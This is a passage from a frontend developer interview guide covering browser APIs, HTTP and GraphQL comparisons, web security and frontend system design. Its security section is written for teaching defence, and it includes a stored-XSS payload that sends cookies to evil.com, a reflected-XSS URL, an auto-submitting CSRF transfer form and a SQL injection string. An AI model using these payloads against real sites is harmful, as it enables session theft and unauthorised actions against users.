  subtree: true,      // watch all descendants
  attributes: true,   // watch attribute changes
});

observer.disconnect(); // stop watching
```

---

## 13. requestAnimationFrame

Schedule animations to run at the **browser's refresh rate** (usually 60fps). Smoother than `setTimeout`.

```js
function animate(timestamp) {
  // Move element
  element.style.transform = `translateX(${timestamp * 0.1}px)`;

  requestAnimationFrame(animate); // schedule next frame
}

requestAnimationFrame(animate);
```

---

## 14. HTTP/1.1 vs HTTP/2 vs HTTP/3

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| Multiplexing | ❌ (one request per connection) | ✅ | ✅ |
| Header compression | ❌ | ✅ (HPACK) | ✅ (QPACK) |
| Server push | ❌ | ✅ | ✅ |
| Protocol | TCP | TCP | QUIC (UDP-based) |
| TLS required | Optional | Effectively yes | Yes |
| Head-of-line blocking | Yes | TCP level | ❌ Fixed |

---

## 15. REST vs GraphQL

| | REST | GraphQL |
|---|---|---|
| Endpoints | Multiple (`/users`, `/posts`) | Single (`/graphql`) |
| Over/under-fetching | Common | No — request exactly what you need |
| Versioning | URL versioning (`/v2/`) | Schema evolution |
| Caching | Easy (HTTP cache) | Requires extra setup |
| Learning curve | Low | Higher |

```graphql
# GraphQL — get exactly what you need
query {
  user(id: "1") {
    name
    email
    posts { title }
  }
}
```

---

# Section 3: Security

---

## 1. XSS — Cross-Site Scripting

**Attack:** Injecting malicious scripts into web pages viewed by other users.

### Types

**Stored XSS** — malicious script saved to database, served to all users.
```
User submits: <script>fetch('https://evil.com?c='+document.cookie)</script>
This gets stored in the DB and rendered for every visitor → steals cookies
```

**Reflected XSS** — script in URL, reflected back in response.
```
https://site.com/search?q=<script>alert(1)</script>
```

**DOM-based XSS** — script injected via JavaScript that manipulates the DOM.

### Prevention

```js
// 1. Never use innerHTML with user data
element.innerHTML = userInput;        // ❌ dangerous
element.textContent = userInput;      // ✅ safe — treats as text, not HTML

// 2. Escape HTML entities
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 3. Content Security Policy header (see below)
// 4. Use DOMPurify library when you MUST render HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput); // ✅

// 5. React is safe by default — JSX auto-escapes
<p>{userInput}</p>     // ✅ React escapes this
<p dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌ Use DOMPurify here
```

---

## 2. CSRF — Cross-Site Request Forgery

**Attack:** Tricks an authenticated user into unknowingly making a request to your server.

```
User is logged into bank.com (has session cookie)
User visits evil.com which has:
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>

Browser sends request WITH the bank.com cookie → transfer happens!
```

### Prevention

```js
// 1. CSRF Token — server sends unique token, client must include it
// Server:
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken);

// Client:
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': getCsrfToken() },
});

// Server validates: token in header must match token in session

// 2. SameSite cookie attribute (modern, best defense)
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict — cookie NOT sent on cross-site requests
// SameSite=Lax    — cookie sent only on top-level GET (safe default)

// 3. Check Origin/Referer header
// 4. Use POST/PUT/DELETE (not GET) for state-changing actions
```

---

## 3. Content Security Policy (CSP)

CSP is an HTTP header that tells the browser **which sources are allowed to load resources**. Strongest defense against XSS.

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline';
```

```js
// Express example
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "img-src 'self' data: https:; " +
    "style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

| Directive | Controls |
|---|---|
| `default-src` | Fallback for all resource types |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | fetch, XHR, WebSocket |
| `'self'` | Same origin only |
| `'none'` | Block everything |

---

## 4. HTTPS & TLS

**HTTP** sends data in plain text — anyone on the network can read it.
**HTTPS** = HTTP + TLS encryption — data is encrypted end-to-end.

**TLS Handshake (simplified):**
1. Client says "I want to connect securely" + supported cipher suites
2. Server sends its **certificate** (contains public key, signed by Certificate Authority)
3. Client verifies the certificate (trusts CA)
4. They exchange keys and establish an **encrypted session**
5. All data encrypted with symmetric key

**Security headers to always include:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains  (HSTS)
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 5. HttpOnly & Secure Cookies

```
Set-Cookie: token=abc123;
  HttpOnly;     ← Cannot be accessed by JavaScript (document.cookie)
  Secure;       ← Only sent over HTTPS
  SameSite=Strict; ← Only sent on same-site requests
  Path=/;
  Max-Age=3600
```

**Why HttpOnly matters:** If an XSS attack succeeds, the attacker's script **cannot read HttpOnly cookies** — so they can't steal the session token.

---

## 6. JWT (JSON Web Tokens)

**Structure:** `header.payload.signature` (Base64 encoded)

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsImV4cCI6MTcwMDAwMH0.AbCdEf...
    Header                   Payload                         Signature
```

```js
// Payload — readable (NOT encrypted, just encoded)
{ userId: 1, role: 'admin', exp: 1700000000 }

// Never store sensitive data in JWT payload!
// Anyone can decode it: atob(token.split('.')[1])

// Storage debate:
// localStorage  — accessible by JS, XSS risk
// httpOnly cookie — safer, but needs CSRF protection
// Recommendation: httpOnly + Secure + SameSite=Strict cookie
```

---

## 7. SQL Injection (Awareness for API Routes)

```js
// ❌ Vulnerable — user input directly in query
const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
// If email = "' OR '1'='1" → dumps all users

// ✅ Safe — parameterized queries
const query = 'SELECT * FROM users WHERE email = $1';
db.query(query, [userEmail]);
```

Even as a frontend dev, when writing Next.js API routes or serverless functions, always use parameterized queries or an ORM.

---

## 8. Dependency Security

```bash
# Check for known vulnerabilities
npm audit
npm audit fix

# Lock dependencies to exact versions in production
npm ci  # uses package-lock.json exactly

# Keep dependencies updated
npm outdated
```

---

## 9. Input Validation

```js
// Frontend validation (UX, not security)
if (!email.includes('@')) showError('Invalid email');

// Backend validation (always required — frontend can be bypassed)
import Joi from 'joi';
const schema = Joi.object({
  email: Joi.string().email().required(),
  age: Joi.number().min(0).max(120).required(),
  name: Joi.string().max(100).pattern(/^[a-zA-Z\s]+$/).required(),
});

const { error } = schema.validate(req.body);
if (error) return res.status(400).json({ error: error.details[0].message });
```

---

# Section 4: System Design for Frontend

---

## 1. How to Approach a Frontend System Design Question

**Framework (use this structure in interviews):**

```
1. Clarify requirements (2 min)
   - Who uses it? Scale? Mobile/desktop?
   - Core features vs nice-to-have?

2. High-level component architecture (5 min)
   - Page/route structure
   - Core components and their relationships
   - Data flow direction

3. Data management (5 min)
   - What state is local vs global?
   - API design? REST or GraphQL?
   - Caching strategy?

4. Performance (3 min)
   - Code splitting? Lazy loading?
   - Image optimization?
   - SSR vs CSR vs SSG?

5. Scalability & maintainability (3 min)
   - Folder structure
   - Design system / component library?
   - Testing strategy?

6. Security & accessibility (2 min)
```

---

## 2. Design a Large-Scale React App Structure

```
src/
├── app/                    # App-level setup
│   ├── store.ts            # Redux/Zustand store
│   ├── router.tsx          # Route definitions
│   └── App.tsx
│
├── features/               # Feature-based modules (recommended)
│   ├── auth/
│   │   ├── components/     # UI components for this feature
│   │   ├── hooks/          # Custom hooks
│   │   ├── api.ts          # API calls
│   │   ├── slice.ts        # Redux slice or Zustand store
│   │   └── types.ts        # TypeScript types
│   ├── dashboard/
│   └── users/
│
├── shared/                 # Shared across features
│   ├── components/         # Button, Input, Modal, etc.
│   ├── hooks/              # useDebounce, useFetch, etc.
│   ├── utils/              # formatDate, parseQuery, etc.
│   └── types/              # Global TS types
│
├── pages/                  # Route-level page components
└── styles/                 # Global styles, design tokens
```

**Why feature-based over type-based?**
- `features/users/` has everything for users in one place
- vs scattered `components/UserCard`, `hooks/useUsers`, `api/users` — harder to navigate

---

## 3. Component Architecture Design

```
Page (route-level, data fetching)
  └── Container/Smart Component (handles state, passes data down)
        └── Presentational/Dumb Component (stateless, just renders props)
              └── Atomic Components (Button, Input, Icon)
```

**Rules:**
- Push state up only as far as needed (co-locate state)
- Presentational components are easy to test and reuse
- Smart components handle data fetching, side effects
- Use compound components for complex UI (Tabs, Accordion, Select)

---

## 4. Design a News Feed (like Twitter/Facebook)

**Requirements:** Real-time feed, infinite scroll, post creation, likes/comments.

**Architecture decisions:**

```
State management:
  - Feed posts → React Query (server state, caching)
  - UI state (modal open, active tab) → useState
  - Auth user → Context or Redux

Data fetching:
  - Initial load: SSR for SEO (getServerSideProps)
  - Infinite scroll: React Query with cursor-based pagination
  - Real-time new posts: WebSocket or SSE

Performance:
  - Virtualize the feed (react-window) — don't render 1000 posts
  - Optimistic updates for likes/comments
  - Debounce post content autosave

Component structure:
  FeedPage
    ├── CreatePostBox
    ├── FeedList (virtualized)
    │     └── PostCard
    │           ├── PostHeader (avatar, name, time)
    │           ├── PostContent (text, images)
    │           └── PostActions (like, comment, share)
    └── NewPostsNotification ("5 new posts" banner)
```

---

## 5. Design an E-Commerce Product Page

```
Performance priorities:
  - LCP (Largest Contentful Paint): product image must load fast
    → Preload hero image, next/image with priority, WebP format
  - CLS (Cumulative Layout Shift): reserve space for images
    → Always set width/height on images
  - TTI (Time to Interactive): JS bundle size
    → Code split: lazy load reviews, recommendations

Caching strategy:
  - Product data → ISR (revalidate every 5 min)
  - Inventory/price → SSR (always fresh — can't cache stock levels)
  - Reviews → SSG + pagination

State:
  - Selected variant (size, color) → useState (local)
  - Cart → Zustand or Redux (global, persisted to localStorage)
  - Wishlist → Zustand + synced to backend

Component tree:
  ProductPage
    ├── ImageGallery (lazy load non-hero images)
    ├── ProductInfo
    │     ├── VariantSelector
    │     └── AddToCartButton (optimistic UI)
    ├── Tabs (lazy loaded)
    │     ├── Description
    │     ├── Specifications
    │     └── Reviews (infinite scroll)
    └── RecommendedProducts (lazy loaded, below fold)
```

---

## 6. Micro-Frontends

Split a large application into **independently deployable frontend modules**, each owned by a different team.

```
Shell App (orchestrator)
  ├── /checkout  → Checkout Team's app
  ├── /profile   → Profile Team's app
  └── /catalog   → Catalog Team's app
```

**Implementation approaches:**
- **Module Federation** (Webpack 5) — load remote JS modules at runtime
- **iframes** — complete isolation, but UX limitations
- **Web Components** — framework-agnostic, native browser support

**Trade-offs:**
- ✅ Independent deployments, team autonomy, technology diversity
- ❌ Bundle duplication, shared state complexity, consistent UX harder

---

## 7. Monorepo Structure (Nx / Turborepo)

```
monorepo/
├── apps/
│   ├── web/           # Main React app
│   ├── admin/         # Admin dashboard
│   └── mobile/        # React Native
├── packages/
│   ├── ui/            # Shared component library
│   ├── utils/         # Shared utilities
│   ├── api-client/    # Shared API types/client
│   └── config/        # Shared ESLint, TS config
└── package.json
```

**Benefits:** Share code between apps, single lint/test/build pipeline, atomic commits across apps.

---

## 8. Performance Budget & Core Web Vitals

**Core Web Vitals (Google ranking factors):**

| Metric | What it measures | Good | Poor |
|---|---|---|---|
| LCP (Largest Contentful Paint) | Loading performance | < 2.5s | > 4s |
| FID/INP (Interaction to Next Paint) | Interactivity | < 200ms | > 500ms |
| CLS (Cumulative Layout Shift) | Visual stability | < 0.1 | > 0.25 |

**Optimization strategies:**

```
LCP:
  - Preload hero images: <link rel="preload" as="image" href="hero.webp">
  - Use CDN for static assets
  - SSR/SSG for faster initial HTML
  - Reduce server response time (TTFB)

CLS:
  - Always set width and height on images/videos
  - Don't inject content above existing content
  - Use skeleton loaders that match content size
  - Font-display: swap with fallback font size matching

INP/FID:
  - Break up long tasks (> 50ms) with scheduler.yield() or setTimeout
  - Use Web Workers for heavy computation
  - Virtualize long lists
  - useTransition for non-urgent updates
```

---

## 9. CDN & Caching Strategy

```
User → CDN Edge (cache hit) → fast response
User → CDN Edge (cache miss) → Origin Server → CDN stores → response

Cache-Control headers:
  Cache-Control: public, max-age=31536000, immutable
    ↑ For hashed assets (app.abc123.js) — cache forever, never changes
  
  Cache-Control: no-cache
    ↑ Browser revalidates every time (but can use cached if ETag matches)
  
  Cache-Control: no-store
    ↑ Never cache (sensitive data)
  
  Cache-Control: max-age=60, stale-while-revalidate=300
    ↑ Fresh for 60s, serve stale for 300s while revalidating in background
```

---

## 10. Design System Architecture

```
Design Tokens (source of truth: colors, spacing, typography)
  ↓
Primitive/Atomic Components (Button, Input, Badge, Icon)
  ↓
Composite Components (Form, Card, Modal, DataTable)
  ↓
Page Templates (DashboardLayout, AuthLayout)
  ↓
Pages
```

```js
// Design tokens as CSS variables
:root {
  --color-primary-500: #3B82F6;
  --color-primary-600: #2563EB;
  --spacing-4: 1rem;
  --radius-md: 0.375rem;
  --font-size-base: 1rem;
  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1);
}

// Component uses tokens, not hard-coded values
.button {
  background: var(--color-primary-500);
  padding: var(--spacing-2) var(--spacing-4);
  border-radius: var(--radius-md);
}
```

---

## 11. Testing Strategy (Testing Pyramid)

```
         /\
        /E2E\       ← Few, slow, expensive (Cypress, Playwright)
       /------\
      / Integr \    ← Some (React Testing Library)
     /----------\
    /    Unit    \  ← Many, fast, cheap (Jest, Vitest)
   /--------------\
```

```js
// Unit test — isolated function
test('formatCurrency formats numbers correctly', () => {
  expect(formatCurrency(1000)).toBe('$1,000.00');
  expect(formatCurrency(-50)).toBe('-$50.00');
});

// Integration test — component with interactions
test('login form submits correctly', async () => {
  render(<LoginForm onLogin={mockLogin} />);
  await userEvent.type(screen.getByLabelText('Email'), 'alice@example.com');
  await userEvent.type(screen.getByLabelText('Password'), 'password123');
  await userEvent.click(screen.getByRole('button', { name: 'Login' }));
  expect(mockLogin).toHaveBeenCalledWith({ email: 'alice@example.com', password: 'password123' });
});

// E2E test — full user flow
test('user can log in and see dashboard', async ({ page }) => {
  await page.goto('/login');
  await page.fill('[name=email]', 'alice@example.com');
  await page.fill('[name=password]', 'password123');
  await page.click('button[type=submit]');
  await expect(page).toHaveURL('/dashboard');
  await expect(page.locator('h1')).toContainText('Welcome, Alice');
});
```

---

## 12. Interview Quick-Reference: Key Trade-offs

| Decision | Option A | Option B | Choose A when | Choose B when |
|---|---|---|---|---|
| Rendering | CSR | SSR/SSG | Auth dashboard | SEO-critical pages |
| State | Context | Redux | Small app | Complex/large app |
| Data fetching | useEffect | React Query | Simple, one-off | Caching, sync needed |
| Routing | React Router | Next.js | SPA | SEO + server features |
| Styling | CSS Modules | Tailwind | Complex custom styles | Rapid UI development |
| Auth tokens | localStorage | httpOnly cookie | Simplicity | Security |

---

*Good luck! Remember: interviewers want to see your **reasoning and trade-off thinking**, not just the right answer.*